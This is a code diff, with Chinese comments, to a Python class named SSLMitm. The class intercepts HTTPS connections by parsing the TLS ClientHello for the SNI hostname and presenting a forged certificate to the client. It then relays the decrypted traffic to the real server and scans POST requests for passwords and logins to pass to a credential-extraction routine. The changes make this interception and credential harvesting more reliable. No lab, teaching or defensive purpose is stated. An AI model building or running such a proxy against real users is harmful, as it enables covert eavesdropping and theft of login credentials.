@@ -166,10 +166,64 @@ class SSLMitm:
         
         return cert, private_key
     
+    def _read_full_tls_record(self, sock, buffer=b''):
+        """讀取完整的TLS記錄，處理分片情況"""
+        data = buffer
+        max_attempts = 10
+        attempt = 0
+        
+        while attempt < max_attempts:
+            # 檢查是否有足夠的數據來讀取記錄頭（5字節）
+            if len(data) < 5:
+                try:
+                    sock.settimeout(1.0)
+                    chunk = sock.recv(4096)
+                    if not chunk:
+                        break
+                    data += chunk
+                except socket.timeout:
+                    if len(data) >= 5:
+                        break  # 有部分數據，嘗試解析
+                    return None, b''
+                except:
+                    return None, b''
+            
+            # 解析TLS記錄頭
+            record_type = data[0]
+            version = (data[1] << 8) | data[2]
+            record_length = (data[3] << 8) | data[4]
+            
+            # 檢查記錄長度是否合理（最大16KB）
+            if record_length > 16384:
+                return None, b''
+            
+            # 檢查是否有完整的記錄
+            total_length = 5 + record_length
+            if len(data) < total_length:
+                # 需要讀取更多數據
+                try:
+                    sock.settimeout(1.0)
+                    chunk = sock.recv(total_length - len(data))
+                    if not chunk:
+                        break
+                    data += chunk
+                except socket.timeout:
+                    # 超時，返回現有數據
+                    return data[:total_length] if len(data) >= total_length else None, data
+                except:
+                    return None, b''
+            
+            # 返回完整的記錄和剩餘數據
+            record = data[:total_length]
+            remaining = data[total_length:]
+            return record, remaining
+        
+        return None, data
+    
     def _extract_sni(self, client_hello):
-        """從TLS Client Hello中提取SNI（Server Name Indication）"""
+        """從TLS Client Hello中提取SNI（Server Name Indication）- 改進版本"""
         try:
-            if len(client_hello) < 5:
+            if not client_hello or len(client_hello) < 5:
                 return None
             
             # 檢查TLS記錄類型（0x16 = Handshake, 0x17 = Application Data）
@@ -185,14 +239,12 @@ class SSLMitm:
             
             # 確保有足夠的數據
             if len(client_hello) < 5 + record_length:
-                # 可能需要讀取更多數據，但先嘗試解析現有數據
-                pass
+                return None  # 數據不完整，需要更多數據
             
             # Handshake消息開始於字節5
-            handshake_start = 5
-            handshake_data = client_hello[handshake_start:]
+            handshake_data = client_hello[5:5+record_length]
             
-            if len(handshake_data) < 1:
+            if len(handshake_data) < 4:
                 return None
             
             # Handshake類型（0x01 = Client Hello）
@@ -201,14 +253,14 @@ class SSLMitm:
                 return None
             
             # Handshake消息長度（3字節）
-            if len(handshake_data) < 4:
-                return None
-            
             handshake_length = (handshake_data[1] << 16) | (handshake_data[2] << 8) | handshake_data[3]
             
+            # 確保handshake數據完整
+            if len(handshake_data) < 4 + handshake_length:
+                return None
+            
             # Client Hello消息開始於字節4
-            client_hello_start = 4
-            client_hello_data = handshake_data[client_hello_start:]
+            client_hello_data = handshake_data[4:4+handshake_length]
             
             if len(client_hello_data) < 35:
                 return None
@@ -252,11 +304,17 @@ class SSLMitm:
                 return None
             offset += compression_methods_length
             
-            # Extensions長度（2字節，TLS 1.2+）
+            # 檢查是否有Extensions（TLS 1.2+）
             if len(client_hello_data) < offset + 2:
-                return None
+                return None  # 沒有extensions
+            
+            # Extensions長度（2字節）
             extensions_length = (client_hello_data[offset] << 8) | client_hello_data[offset + 1]
             offset += 2
+            
+            # 確保extensions數據完整
+            if len(client_hello_data) < offset + extensions_length:
+                return None
             
             # 遍歷Extensions
             ext_end = offset + extensions_length
@@ -266,7 +324,7 @@ class SSLMitm:
                 offset += 2
                 
                 # Extension長度（2字節）
-                if offset + 2 > len(client_hello_data):
+                if offset + 2 > len(client_hello_data) or offset + 2 > ext_end:
                     break
                 ext_length = (client_hello_data[offset] << 8) | client_hello_data[offset + 1]
                 offset += 2
@@ -274,27 +332,28 @@ class SSLMitm:
                 # SNI extension類型是0
                 if ext_type == 0:
                     # Server Name List長度（2字節）
-                    if offset + 2 > len(client_hello_data):
+                    if offset + 2 > len(client_hello_data) or offset + 2 > ext_end:
                         break
                     server_name_list_length = (client_hello_data[offset] << 8) | client_hello_data[offset + 1]
                     offset += 2
                     
                     # Server Name條目
-                    if offset + 3 > len(client_hello_data):
+                    if offset + 3 > len(client_hello_data) or offset + 3 > ext_end:
                         break
                     name_type = client_hello_data[offset]
                     offset += 1
                     
                     # Name長度（2字節）
-                    if offset + 2 > len(client_hello_data):
+                    if offset + 2 > len(client_hello_data) or offset + 2 > ext_end:
                         break
                     name_length = (client_hello_data[offset] << 8) | client_hello_data[offset + 1]
                     offset += 2
                     
                     # Name（host_name類型為0）
-                    if name_type == 0 and offset + name_length <= len(client_hello_data):
+                    if name_type == 0 and offset + name_length <= len(client_hello_data) and offset + name_length <= ext_end:
                         server_name = client_hello_data[offset:offset + name_length].decode('utf-8', errors='ignore')
-                        return server_name
+                        if server_name and len(server_name) > 0:
+                            return server_name
                     break
                 
                 # 跳過此extension
@@ -302,38 +361,22 @@ class SSLMitm:
             
             return None
         except Exception as e:
-            # 調試：輸出錯誤信息（僅在開發時）
-            # print(f"[DEBUG] SNI提取錯誤: {e}")
             return None
     
     def _handle_client(self, client_socket, client_addr):
-        """處理客戶端連接"""
+        """處理客戶端連接 - 改進版本"""
         host = None
+        buffer = b''
         try:
-            client_socket.settimeout(30)
+            client_socket.settimeout(10)  # 設置較短的超時時間
             
-            # 使用SSL上下文來捕獲SNI
-            # 創建一個臨時的SSL上下文，設置SNI回調
-            temp_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-            sni_host = [None]  # 使用列表以便在回調中修改
+            # 方法1：使用改進的TLS記錄讀取來提取SNI
+            client_hello, buffer = self._read_full_tls_record(client_socket, buffer)
             
-            def sni_callback(ssl_sock, server_name, ssl_context):
-                if server_name:
-                    sni_host[0] = server_name
-                return None
+            if client_hello:
+                host = self._extract_sni(client_hello)
             
-            temp_context.set_servername_callback(sni_callback)
-            
-            # 讀取Client Hello數據
-            client_hello = client_socket.recv(8192)
-            
-            if not client_hello:
-                return
-            
-            # 方法1：嘗試從原始數據中提取SNI
-            host = self._extract_sni(client_hello)
-            
-            # 方法2：如果方法1失敗，嘗試使用SSL模組的SNI回調
+            # 方法2：如果方法1失敗，嘗試使用SSL模組的SNI回調（需要重新讀取）
             if not host:
                 try:
                     # 創建一個臨時證書用於SNI提取
@@ -355,32 +398,23 @@ class SSLMitm:
                         temp_key_path = key_file.name
                     
                     try:
+                        # 創建SSL上下文並設置SNI回調
+                        temp_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                         temp_context.load_cert_chain(temp_cert_path, temp_key_path)
+                        sni_host = [None]
                         
-                        # 將socket包裝為SSL來觸發SNI回調
-                        # 注意：這需要完整的握手，但我們可以在握手過程中獲取SNI
-                        ssl_sock = temp_context.wrap_socket(client_socket, server_side=True, do_handshake_on_connect=False)
+                        def sni_callback(ssl_sock, server_name, ssl_context):
+                            if server_name:
+                                sni_host[0] = server_name
+                            return None
                         
-                        # 嘗試進行握手（這會觸發SNI回調）
-                        try:
-                            ssl_sock.do_handshake()
-                        except:
-                            # 即使握手失敗，SNI應該已經被提取
-                            pass
+                        temp_context.set_servername_callback(sni_callback)
                         
-                        if sni_host[0]:
-                            host = sni_host[0]
-                            # SNI已提取，但我們已經進行了部分握手
-                            # 需要關閉這個連接並重新開始
-                            try:
-                                ssl_sock.close()
-                            except:
-                                pass
-                            # 注意：這裡不能重新連接，因為客戶端已經連接了
-                            # 我們需要從原始數據開始，但socket已經被SSL包裝了
-                            # 所以如果使用SSL方法提取SNI，我們需要繼續使用這個SSL連接
-                            # 但為了簡化，我們只在SNI提取成功時使用這個方法
-                            # 實際上，如果SSL握手已經開始，我們應該繼續使用這個連接
+                        # 創建一個新的socket來進行SNI提取（因為原socket可能已經讀取了數據）
+                        # 但實際上我們無法重新連接，所以這個方法有限制
+                        # 改為：如果buffer中有數據，嘗試從中提取
+                        if buffer:
+                            host = self._extract_sni(buffer)
                         
                         try:
                             os.unlink(temp_cert_path)
@@ -393,7 +427,6 @@ class SSLMitm:
                             os.unlink(temp_key_path)
                         except:
                             pass
-                        # 如果SSL方法也失敗，繼續嘗試其他方法
                         pass
                 except Exception as e:
                     pass
@@ -403,24 +436,26 @@ class SSLMitm:
                 try:
                     import re
                     # 在Client Hello中搜索域名模式
-                    client_hello_str = client_hello.decode('latin-1', errors='ignore')
-                    # 查找常見的頂級域名模式
-                    domain_pattern = r'\b([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}\b'
-                    matches = re.findall(domain_pattern, client_hello_str)
-                    if matches:
-                        # 過濾掉明顯不是域名的匹配（如版本號等）
-                        for match in matches:
-                            potential_host = match[0] if isinstance(match, tuple) else match
-                            # 驗證：域名應該在合理長度內，且不包含明顯的無效字符
-                            if (3 < len(potential_host) < 255 and 
-                                '.' in potential_host and 
-                                not potential_host.startswith('.') and
-                                not potential_host.endswith('.')):
-                                # 排除一些明顯不是域名的模式
-                                if not re.match(r'^\d+\.\d+\.\d+', potential_host):  # 排除IP地址模式
-                                    host = potential_host
-                                    print(f"[*] 使用啟發式方法找到域名: {host}")
-                                    break
+                    search_data = client_hello if client_hello else buffer
+                    if search_data:
+                        client_hello_str = search_data.decode('latin-1', errors='ignore')
+                        # 查找常見的頂級域名模式
+                        domain_pattern = r'\b([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}\b'
+                        matches = re.findall(domain_pattern, client_hello_str)
+                        if matches:
+                            # 過濾掉明顯不是域名的匹配（如版本號等）
+                            for match in matches:
+                                potential_host = match[0] if isinstance(match, tuple) else match
+                                # 驗證：域名應該在合理長度內，且不包含明顯的無效字符
+                                if (3 < len(potential_host) < 255 and 
+                                    '.' in potential_host and 
+                                    not potential_host.startswith('.') and
+                                    not potential_host.endswith('.')):
+                                    # 排除一些明顯不是域名的模式
+                                    if not re.match(r'^\d+\.\d+\.\d+', potential_host):  # 排除IP地址模式
+                                        host = potential_host
+                                        print(f"[*] 使用啟發式方法找到域名: {host}")
+                                        break
                 except Exception as e:
                     pass
             
@@ -455,51 +490,119 @@ class SSLMitm:
                 key_file.write(key_pem)
                 key_path = key_file.name
             
+            ssl_client = None
+            ssl_server = None
+            server_socket = None
+            
             try:
+                # 如果我們已經讀取了Client Hello，需要將數據放回socket
+                # 但由於socket不支持"unread"，我們需要創建一個新的socket連接
+                # 或者使用一個緩衝的socket包裝器
+                
+                # 創建一個緩衝的socket包裝器來處理已讀取的數據
+                class BufferedSocket:
+                    def __init__(self, sock, initial_data):
+                        self.sock = sock
+                        self.buffer = initial_data
+                        self.settimeout = sock.settimeout
+                        self.gettimeout = sock.gettimeout
+                    
+                    def recv(self, bufsize):
+                        if self.buffer:
+                            data = self.buffer[:bufsize]
+                            self.buffer = self.buffer[bufsize:]
+                            return data
+                        return self.sock.recv(bufsize)
+                    
+                    def send(self, data):
+                        return self.sock.send(data)
+                    
+                    def close(self):
+                        return self.sock.close()
+                    
+                    def __getattr__(self, name):
+                        return getattr(self.sock, name)
+                
+                # 將已讀取的數據放回緩衝區
+                buffered_socket = BufferedSocket(client_socket, client_hello if client_hello else buffer)
+                
                 # 使用我們的證書與客戶端建立SSL連接
                 context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                 context.load_cert_chain(cert_path, key_path)
+                # 設置較短的超時以避免長時間等待
+                context.set_default_verify_paths()
                 
-                # 將socket包裝為SSL
-                ssl_client = context.wrap_socket(client_socket, server_side=True)
+                # 將socket包裝為SSL，設置較短的超時
+                buffered_socket.settimeout(15)
+                try:
+                    ssl_client = context.wrap_socket(buffered_socket, server_side=True, do_handshake_on_connect=False)
+                    # 執行握手，設置超時
+                    ssl_client.settimeout(15)
+                    ssl_client.do_handshake()
+                except ssl.SSLError as e:
+                    if "timed out" in str(e).lower() or "handshake" in str(e).lower():
+                        print(f"[!] SSL握手超時或失敗: {e}")
+                    raise
+                except socket.timeout:
+                    print(f"[!] SSL握手超時")
+                    raise
                 
                 # 與真實服務器建立連接
                 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                server_socket.settimeout(30)
+                server_socket.settimeout(10)  # 較短的連接超時
                 
                 try:
                     server_socket.connect((host, 443))
                 except socket.gaierror:
                     # DNS解析失敗，嘗試使用IP地址
-                    import socket as sock
                     try:
-                        ip = sock.gethostbyname(host)
+                        ip = socket.gethostbyname(host)
                         server_socket.connect((ip, 443))
-                    except:
-                        print(f"[!] 無法連接到 {host}")
+                    except Exception as e:
+                        print(f"[!] 無法連接到 {host}: {e}")
                         return
+                except socket.timeout:
+                    print(f"[!] 連接服務器超時: {host}")
+                    return
+                except Exception as e:
+                    print(f"[!] 連接服務器失敗: {host}: {e}")
+                    return
                 
                 # 與真實服務器建立SSL連接
                 server_context = ssl.create_default_context()
-                ssl_server = server_context.wrap_socket(server_socket, server_hostname=host)
+                server_socket.settimeout(15)
+                try:
+                    ssl_server = server_context.wrap_socket(server_socket, server_hostname=host)
+                except Exception as e:
+                    print(f"[!] 與服務器SSL握手失敗: {e}")
+                    return
                 
                 # 在兩個SSL連接之間轉發數據
-                def forward_data(source, dest, name):
+                def forward_data(source, dest, name, timeout=300):
                     try:
-                        while True:
-                            data = source.recv(4096)
-                            if not data:
-                                break
-                            dest.send(data)
-                            
-                            # 嘗試從解密後的HTTP數據中提取憑證
+                        source.settimeout(30)  # 設置接收超時
+                        start_time = time.time()
+                        while time.time() - start_time < timeout:
                             try:
-                                decoded = data.decode('utf-8', errors='ignore')
-                                if 'POST' in decoded and ('password' in decoded.lower() or 'login' in decoded.lower()):
-                                    self._extract_credentials(decoded, client_addr)
-                            except:
-                                pass
-                    except:
+                                data = source.recv(4096)
+                                if not data:
+                                    break
+                                dest.send(data)
+                                
+                                # 嘗試從解密後的HTTP數據中提取憑證
+                                try:
+                                    decoded = data.decode('utf-8', errors='ignore')
+                                    if 'POST' in decoded and ('password' in decoded.lower() or 'login' in decoded.lower()):
+                                        self._extract_credentials(decoded, client_addr)
+                                except:
+                                    pass
+                            except socket.timeout:
+                                # 超時，繼續等待
+                                continue
+                            except (ssl.SSLError, OSError, ConnectionError):
+                                # 連接關閉或錯誤
+                                break
+                    except Exception as e:
                         pass
                 
                 # 啟動轉發線程
@@ -522,10 +625,23 @@ class SSLMitm:
                 client_to_server.join(timeout=300)
                 server_to_client.join(timeout=300)
                 
-                ssl_server.close()
-                ssl_client.close()
-                
             finally:
+                # 清理資源
+                try:
+                    if ssl_server:
+                        ssl_server.close()
+                except:
+                    pass
+                try:
+                    if ssl_client:
+                        ssl_client.close()
+                except:
+                    pass
+                try:
+                    if server_socket:
+                        server_socket.close()
+                except:
+                    pass
                 # 清理臨時文件
                 try:
                     os.unlink(cert_path)
